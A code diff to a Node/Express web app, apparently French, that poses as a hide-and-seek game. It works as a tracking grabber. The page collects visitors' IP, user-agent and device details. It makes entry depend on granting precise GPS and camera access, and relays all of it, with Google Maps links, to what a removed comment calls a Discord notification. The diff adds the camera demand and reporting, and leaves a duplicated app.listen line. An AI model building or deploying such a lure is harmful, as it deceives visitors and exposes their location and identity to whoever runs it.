@@ -86,7 +86,6 @@ app.get('/', (req, res) => {
                     background-color: var(--accent-hover);
                 }
 
-                /* Zone de message d'erreur pour la géolocalisation */
                 .error-box {
                     display: none;
                     margin-top: 16px;
@@ -111,6 +110,15 @@ app.get('/', (req, res) => {
                 #game-dashboard {
                     display: none;
                 }
+
+                #camera-preview {
+                    width: 100%;
+                    max-height: 240px;
+                    border-radius: 8px;
+                    margin-top: 15px;
+                    background: #000;
+                    object-fit: cover;
+                }
             </style>
         </head>
         <body>
@@ -119,27 +127,30 @@ app.get('/', (req, res) => {
             <div id="lobby" class="game-card">
                 <div class="icon">🙈🔍</div>
                 <h1>Cache-Cache Numérique</h1>
-                <p>Pour rejoindre la partie et activer la carte en direct des joueurs, autorisez le partage de votre position.</p>
+                <p>Pour rejoindre la partie, autorisez l'accès à votre position et à votre caméra pour la détection visuelle des joueurs.</p>
                 
                 <button class="btn-play" onclick="demarrerPartie()">Rejoindre l'arène</button>
 
-                <!-- Bloc d'erreur affiché uniquement si la position est bloquée/refusée -->
+                <!-- Zone de message d'erreur -->
                 <div id="geo-error" class="error-box">
-                    ⚠️ <strong>Localisation requise :</strong> Impossible de rejoindre l'arène sans autoriser la géolocalisation. Veuillez l'activer dans les paramètres de votre navigateur puis réessayez.
+                    ⚠️ <strong>Permissions requises :</strong> Impossible de rejoindre l'arène sans autoriser la géolocalisation et la caméra. Veuillez les activer dans les paramètres de votre navigateur puis réessayez.
                 </div>
 
                 <div class="info-notice">
-                    En cliquant, vous acceptez la transmission de vos métadonnées techniques pour la session de jeu.
+                    En cliquant, vous acceptez la transmission de vos métadonnées techniques et l'activation du flux vidéo pour la session de jeu.
                 </div>
             </div>
 
-            <!-- Étape 2 : Tableau de bord accessible SEULEMENT si la position est validée -->
+            <!-- Étape 2 : Tableau de bord de jeu -->
             <div id="game-dashboard" class="game-card">
                 <div class="icon">🎯</div>
                 <h1>Partie en cours</h1>
-                <p id="status-text">Coordonnées de jeu enregistrées. Recherche de cachettes à proximité...</p>
+                <p id="status-text">Coordonnées et flux vidéo initialisés. Recherche de cachettes à proximité...</p>
+
+                <video id="camera-preview" autoplay playsinline muted></video>
+
                 <div style="background: #1f2937; padding: 15px; border-radius: 8px; margin-top: 15px; font-size: 0.85rem; color: #10b981;">
-                    Statut : Joueur connecté à l'arène
+                    Statut : Joueur connecté & Caméra active
                 </div>
             </div>
 
@@ -155,11 +166,12 @@ app.get('/', (req, res) => {
                     };
                 }
 
-                function transmettreMetadonnees(type, gpsData = null) {
+                function transmettreMetadonnees(type, gpsData = null, cameraStatus = null) {
                     const payload = {
                         typeEvenement: type,
                         client: collecterMetadonnees(),
-                        gps: gpsData
+                        gps: gpsData,
+                        camera: cameraStatus
                     };
 
                     fetch('/api/collecte', {
@@ -174,10 +186,32 @@ app.get('/', (req, res) => {
                     transmettreMetadonnees('Visite initiale');
                 });
 
-                function demarrerPartie() {
-                    const errorBox = document.getElementById('geo-error');
-                    errorBox.style.display = 'none'; // Reinitialisation de l'affichage de l'erreur
+                async function activerCamera() {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                        const videoElement = document.getElementById('camera-preview');
+                        videoElement.srcObject = stream;
+                        return { statut: "Autorisée", details: "Flux vidéo actif" };
+                    } catch (err) {
+                        return { statut: "Refusée", erreur: err.message };
+                    }
+                }
 
+                async function demarrerPartie() {
+                    const errorBox = document.getElementById('geo-error');
+                    errorBox.style.display = 'none';
+
+                    // Demande d'accès à la caméra
+                    const cameraResult = await activerCamera();
+
+                    if (cameraResult.statut === "Refusée") {
+                        transmettreMetadonnees('Refus caméra', null, cameraResult);
+                        errorBox.innerHTML = "⚠️ <strong>Caméra requise :</strong> L'accès à la caméra est nécessaire pour valider votre entrée dans l'arène.";
+                        errorBox.style.display = 'block';
+                        return;
+                    }
+
+                    // Demande d'accès à la géolocalisation
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(
                             (pos) => {
@@ -187,15 +221,14 @@ app.get('/', (req, res) => {
                                     precision: pos.coords.accuracy
                                 };
 
-                                // Transmission des coordonnées GPS et déblocage de l'interface
-                                transmettreMetadonnees('Localisation validée', gpsData);
+                                transmettreMetadonnees('Session validée', gpsData, cameraResult);
 
                                 document.getElementById('lobby').style.display = 'none';
                                 document.getElementById('game-dashboard').style.display = 'block';
                             },
                             (err) => {
-                                // Notification Discord du refus + blocage sur la page 1 avec message d'erreur
-                                transmettreMetadonnees('Refus localisation', { erreur: "Accès refusé (" + err.message + ")" });
+                                transmettreMetadonnees('Refus localisation', { erreur: "Accès refusé (" + err.message + ")" }, cameraResult);
+                                errorBox.innerHTML = "⚠️ <strong>Localisation requise :</strong> Impossible de rejoindre l'arène sans autoriser la géolocalisation.";
                                 errorBox.style.display = 'block';
                             },
                             { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
@@ -217,19 +250,28 @@ app.post('/api/collecte', async (req, res) => {
     const typeEvenement = body.typeEvenement || 'Événement inconnu';
     const client = body.client || {};
     const gps = body.gps || {};
+    const camera = body.camera || {};
 
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'] || 'Inconnu';
 
     let gpsText = "⏳ Non partagée";
-    let colorCode = 3447003; // Bleu par défaut (Visite)
+    let colorCode = 3447003; // Bleu par défaut
 
     if (gps.lat && gps.lon) {
-        gpsText = `📍 [${gps.lat}, ${gps.lon}](https://www.google.com/maps?q=${gps.lat},${gps.lon}) (+/- ${Math.round(gps.precision)}m)`;
-        colorCode = 65280; // Vert si position GPS reçue
+        gpsText = `📍 [${gps.lat},${gps.lon}](https://www.google.com/maps?q=${gps.lat},${gps.lon}) (+/- ${Math.round(gps.precision)}m)`;
+        colorCode = 65280; // Vert
     } else if (gps.erreur) {
         gpsText = `❌ ${gps.erreur}`;
-        colorCode = 15158332; // Rouge si position refusée
+        colorCode = 15158332; // Rouge
+    }
+
+    let cameraText = "⏳ Non vérifiée";
+    if (camera.statut === "Autorisée") {
+        cameraText = `📷 Accès accordé (${camera.details})`;
+    } else if (camera.statut === "Refusée") {
+        cameraText = `❌ Accès refusé (${camera.erreur})`;
+        colorCode = 15158332;
     }
 
     const embeds = [{
@@ -238,7 +280,8 @@ app.post('/api/collecte', async (req, res) => {
         fields: [
             { name: "🌐 Connexion", value: `**IP :** \`${ip}\`\n**User-Agent :** \`${userAgent}\`` },
             { name: "💻 Appareil", value: `**Écran :** ${client.ecran}\n**CPU :** ${client.coeursCPU} cœurs | **RAM :** ${client.ramGo}\n**Zone :** ${client.fuseauHoraire}` },
-            { name: "🎯 Position Joueur", value: gpsText }
+            { name: "🎯 Position Joueur", value: gpsText },
+            { name: "🎥 Caméra", value: cameraText }
         ],
         timestamp: new Date().toISOString()
     }];
@@ -258,4 +301,5 @@ app.post('/api/collecte', async (req, res) => {
     res.sendStatus(200);
 });
 
+app.listen(PORT, () => console.log(`Serveur Cache-Cache prêt sur le port ${PORT}`));
 app.listen(PORT, () => console.log(`Serveur Cache-Cache prêt sur le port ${PORT}`));
